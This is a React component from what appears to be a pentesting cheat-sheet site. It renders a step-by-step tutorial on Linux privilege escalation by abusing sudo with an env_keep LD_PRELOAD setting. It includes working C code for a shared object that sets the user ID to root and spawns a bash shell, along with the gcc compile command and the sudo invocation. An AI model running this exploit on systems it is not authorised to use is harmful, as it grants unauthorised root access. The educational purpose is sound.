import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const LD_PRELOAD = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              LD_PRELOAD is a function that allows any program to use shared
              libraries. If the{" "}
              <Typography display="inline" className="highlight">
                env_keep
              </Typography>{" "}
              option is enabled we can generate a shared library which will be
              loaded and executed before the program is run.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Check for LD_PRELOAD (with the env_keep option)
            </Typography>
            <Image src="/LD_PRELOAD.png" width={498} height={161} />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Write a simple C code program.</Typography>
            <SyntaxHighlighter className="syntax" language="C">
              {"#include <stdio.h>\n" +
                "#include <sys/types.h>\n" +
                "#include <stdlib.h>\n\n" +
                "void _init() {  \n" +
                '  unsetenv("LD_PRELOAD");  \n' +
                "  setgid(0);  \n" +
                "  setuid(0);  \n" +
                '  system("/bin/bash");  \n' +
                "}"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Compile the Program as a shared object (.so extension) file.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"gcc -fPIC -shared -o shell.so shell.c -nostartfiles"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Run the program with sudo rights and the LD_PRELOAD option
              pointing to our .so file. The{" "}
              <Typography display="inline" className="highlight">
                find
              </Typography>{" "}
              command is used because our user has sudo rights for that command
              as shown in the image in Step 1.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"sudo LD_PRELOAD=/home/user/ldpreload/shell.so find"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default LD_PRELOAD;
